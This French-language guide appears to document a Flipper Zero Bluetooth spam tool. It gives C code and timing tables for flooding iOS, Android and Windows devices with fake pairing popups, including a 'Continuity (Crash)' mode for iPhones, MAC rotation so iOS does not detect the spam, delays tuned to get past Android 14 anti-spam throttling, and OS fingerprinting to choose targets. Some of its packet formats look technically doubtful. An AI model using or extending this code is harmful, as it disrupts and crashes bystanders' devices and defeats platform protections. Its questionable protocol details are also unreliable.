# 🌍 Guide de Compatibilité Multi-Plateforme

## iOS (17.5+) - Optimisations Essentielles

### Problème #1: CPU Throttling à 20ms
**Symptôme:** Les iPhones ralentissent drastiquement après quelques secondes  
**Cause:** BLE advertising constant à 20ms surcharge le CPU

**Solution:**
```c
// ❌ AVANT - Trop agressif
config->min_adv_interval_ms = 20;
config->max_adv_interval_ms = 25;

// ✅ APRÈS - Adapté à iOS
config->min_adv_interval_ms = 80;
config->max_adv_interval_ms = 120;
```

**Délais Recommandés par Type:**
```
Continuity (Crash):      80-100 ms
Nearby Action:          100-150 ms
Proximity Pair:         100-150 ms
Mixed (Kitchen Sink):    80-100 ms
```

### Problème #2: Battery Status Simulation
**Symptôme:** Popups not appearing on iOS 17.5+  
**Cause:** Continuity payload missing battery info

**Solution - Créer dans `protocols/continuity.c`:**
```c
static void add_battery_status(uint8_t* packet, uint8_t* size) {
    if(*size + 3 > 31) return;  // Check space
    
    // Battery TLV format: Type=0x03, Length=1, Value=battery%
    packet[*size] = 0x03;      // Type: Battery
    packet[*size + 1] = 0x01;  // Length
    packet[*size + 2] = 75;    // 75% battery simulation
    
    *size += 3;
}

// Usage dans make_packet:
static void continuity_make_packet(...) {
    // ... existing code ...
    
    // Add battery status
    if(payload->cfg.continuity.data.nearby_action.battery.level > 0) {
        add_battery_status(packet, &size);
    }
    
    // ...
}
```

### Problème #3: MAC Randomization
**Symptôme:** iOS détecte le spam car même MAC  
**Cause:** MAC non changé assez souvent

**Solution:**
```c
// En haut de ble_spam.c
static uint32_t last_mac_change_ms = 0;
#define MAC_ROTATION_INTERVAL_MS 5000  // Change MAC tous les 5 sec

static void check_and_rotate_mac(State* state) {
    uint32_t now = furi_get_tick();
    
    if((now - last_mac_change_ms) > MAC_ROTATION_INTERVAL_MS) {
        randomize_mac(state);
        last_mac_change_ms = now;
        FURI_LOG_D("BLE_SPAM", "MAC rotated");
    }
}

// Appeler dans advertising thread:
if(payload->random_mac) {
    check_and_rotate_mac(state);
}
```

### Problème #4: Handoff vs Proximity Pair
**Symptôme:** Certains types de Continuity bloqués  
**Cause:** Type incompatible ou malformé

**Solution - Types à Supporter:**
```c
typedef enum {
    ContinuityTypeAirDrop = 0x05,           // ✅ Works
    ContinuityTypeProximityPair = 0x07,     // ✅ Works
    ContinuityTypeNearbyAction = 0x0F,      // ✅ Works
    ContinuityTypeNearbyInfo = 0x10,        // ✅ Works (iOS 17.2+)
    
    // À ÉVITER:
    // ContinuityTypeHandoff = 0x0C,        // ❌ Deprecated iOS 17+
    // ContinuityTypeAirplayTarget = 0x09,  // ❌ Requires proper setup
} ContinuityType;
```

---

## Android (12+) - Optimisations Essentielles

### Problème #1: FastPair Model Whitelist
**Symptôme:** PopUp n'apparait pas  
**Cause:** Model ID n'est pas dans whitelist Google

**Solution:**
```c
// Dans fastpair.c - Utiliser modèles vérifiés
static const uint32_t fast_pair_models[] = {
    0x0000F0,    // Bose QuietComfort 35 II ✅ Vérifiés
    0x0002F0,    // JBL Everest 110GA
    0x0582FD,    // Pixel Buds
    0x0202F0,    // JBL Everest 310GA
    // ... autres modèles populaires ...
};

// Rotation des modèles populaires
static uint32_t get_popular_fastpair_model(void) {
    static uint8_t index = 0;
    uint32_t model = fast_pair_models[index];
    index = (index + 1) % COUNT_OF(fast_pair_models);
    return model;
}
```

### Problème #2: Reboot Cooldown
**Symptôme:** Device reboot après 30 secondes de spam  
**Cause:** Anti-spam GMS détecte le spam agressif

**Solution - Adapter délai:**
```c
// ✅ FastPair optimisé
config->min_adv_interval_ms = 60;
config->max_adv_interval_ms = 90;

// ❌ À ÉVITER
// config->min_adv_interval_ms = 20;  // Trigger GMS
// config->max_adv_interval_ms = 30;
```

### Problème #3: Samsung EasySetup vs FastPair
**Symptôme:** Certains appareils Samsung ne réagissent pas  
**Cause:** EasySetup utilise protocole différent

**Solution:**
```c
// Doubler les types de payloads
typedef enum {
    EasysetupTypeBuds = 0x01,      // Buds, Earbuds
    EasysetupTypeWatch = 0x02,     // Galaxy Watch
    EasysetupTypeSmartThings = 0x03, // SmartThings devices
    EasysetupTypeTV = 0x04,         // Samsung TV
} EasysetupType;

// Rotation entre EasySetup et FastPair
static void rotate_android_attacks(State* state) {
    static uint8_t attack_cycle = 0;
    
    if(attack_cycle == 0) {
        state->index = ATTACK_FASTPAIR;  // FastPair
    } else {
        state->index = ATTACK_EASYSETUP; // EasySetup
    }
    
    attack_cycle = (attack_cycle + 1) % 2;
}
```

### Problème #4: Android 14+ Anti-Spam
**Symptôme:** BLE advertising bloqué après quelques minutes  
**Cause:** Android 14 restreint BLE agressif

**Solution:**
```c
// Ajouter variation de délai adaptative
static uint16_t get_android_adaptive_delay(void) {
    static uint32_t packet_count = 0;
    packet_count++;
    
    // Augmenter délai graduellement pour contourner throttling
    if(packet_count > 1000) {
        return 80;  // 1000+ packets: 80ms
    } else if(packet_count > 500) {
        return 70;  // 500+ packets: 70ms
    } else {
        return 60;  // < 500 packets: 60ms
    }
}
```

---

## Windows (11 21H2+) - Optimisations Essentielles

### Problème #1: GATT Validation Stricte
**Symptôme:** SwiftPair pairing échoue  
**Cause:** Windows 11 valide strict la structure des paquets

**Solution:**
```c
// Dans swiftpair.c - Respecter format strict
static bool create_swiftpair_packet(uint8_t* size, uint8_t** packet) {
    // Format strict Windows 11:
    // - Version: 0x00
    // - Flags: 0x01 (show UI)
    // - Device Type: 0x01 (headphones)
    // - UUID: 16 bytes
    // - CRC: 1 byte
    
    uint8_t* buf = malloc(31);
    int pos = 0;
    
    // Header
    buf[pos++] = 0x00;  // Version
    buf[pos++] = 0x01;  // Flags
    buf[pos++] = 0x01;  // Device Type
    
    // UUID (16 bytes) - important!
    for(int i = 0; i < 16; i++) {
        buf[pos++] = swiftpair_uuid[i];
    }
    
    // CRC
    buf[pos] = calculate_crc(buf, pos);
    pos++;
    
    *size = pos;
    *packet = buf;
    
    // Valider conformité
    if(pos > 31) {
        FURI_LOG_E("SWIFTPAIR", "Packet too large!");
        free(buf);
        return false;
    }
    
    return true;
}
```

### Problème #2: Délai Minimum 50ms
**Symptôme:** Handshake GATT timeout  
**Cause:** Windows n'accepte pas advertising < 50ms

**Solution:**
```c
// SwiftPair délai optimisé
static const uint16_t WINDOWS_SWIFTPAIR_MIN_DELAY = 100;  // 100ms for safety
static const uint16_t WINDOWS_SWIFTPAIR_MAX_DELAY = 200;  // 200ms max

config->min_adv_interval_ms = WINDOWS_SWIFTPAIR_MIN_DELAY;
config->max_adv_interval_ms = WINDOWS_SWIFTPAIR_MAX_DELAY;
```

### Problème #3: Notification Popups
**Symptôme:** Les notifications "Device Found" ne s'affichent pas  
**Cause:** Windows cache les notifications après 3-5 secondes

**Solution - Implémenter burst pattern:**
```c
// Envoyer bursts de packets au lieu de continuous
#define WINDOWS_BURST_SIZE 5         // 5 packets per burst
#define WINDOWS_BURST_INTERVAL_MS 2000  // Attendre 2 sec entre bursts

typedef struct {
    uint8_t packet_in_burst;
    uint32_t next_burst_time;
} BurstState;

static BurstState burst = {0};

void windows_adaptive_burst(State* state) {
    uint32_t now = furi_get_tick();
    
    if(now < burst.next_burst_time) {
        // En attente avant prochain burst
        return;
    }
    
    if(burst.packet_in_burst < WINDOWS_BURST_SIZE) {
        // Continuer burst
        start_extra_beacon(state);
        burst.packet_in_burst++;
    } else {
        // Burst terminé, attendre
        burst.packet_in_burst = 0;
        burst.next_burst_time = now + WINDOWS_BURST_INTERVAL_MS;
    }
}
```

---

## Détection Automatique de Plateforme

### Implémentation du Device Fingerprinting

```c
typedef enum {
    OS_UNKNOWN = 0,
    OS_IOS = 1,
    OS_ANDROID = 2,
    OS_WINDOWS = 3,
} DetectedOS;

// Scanner de paquets BLE pour détection
typedef struct {
    DetectedOS detected_os;
    uint8_t confidence;  // 0-100%
    uint8_t scan_count;
} OSDetector;

static DetectedOS detect_os_from_advertisement(const uint8_t* adv_data, uint8_t len) {
    // Chercher signatures spécifiques aux OS
    
    // iOS: Chercher Continuity frames
    for(int i = 0; i < len - 3; i++) {
        if(adv_data[i] == 0x4C && adv_data[i+1] == 0x00) {  // Apple MFG ID
            return OS_IOS;
        }
    }
    
    // Android: Chercher Fast Pair frames
    for(int i = 0; i < len - 3; i++) {
        if(adv_data[i] == 0x2C && adv_data[i+1] == 0x01) {  // Fast Pair Service
            return OS_ANDROID;
        }
    }
    
    // Windows: Chercher Swift Pair frames
    for(int i = 0; i < len - 3; i++) {
        if(adv_data[i] == 0xFE && adv_data[i+1] == 0x00) {  // Swift Pair
            return OS_WINDOWS;
        }
    }
    
    return OS_UNKNOWN;
}
```

---

## Matrice de Compatibilité Finale

| Fonctionnalité | iOS 17+ | Android 13+ | Windows 11 |
|----------------|---------|-----------|-----------|
| Continuity | ✅ 80ms | ✅ via FAP | ❌ |
| FastPair | ❌ | ✅ 60ms | ❌ |
| EasySetup | ❌ | ✅ 60ms | ❌ |
| SwiftPair | ❌ | ❌ | ✅ 100ms |
| Kitchen Sink | ✅ Mixed | ✅ Mixed | ✅ Mixed |
| Battery Sim | ✅ | ✅ | ❌ |
| MAC Rotation | ✅ 5sec | ✅ 5sec | ✅ 5sec |

---

**Version:** 1.0  
**Dernière maj:** 7 Avril 2026  
**Applicable à:** v7.0+
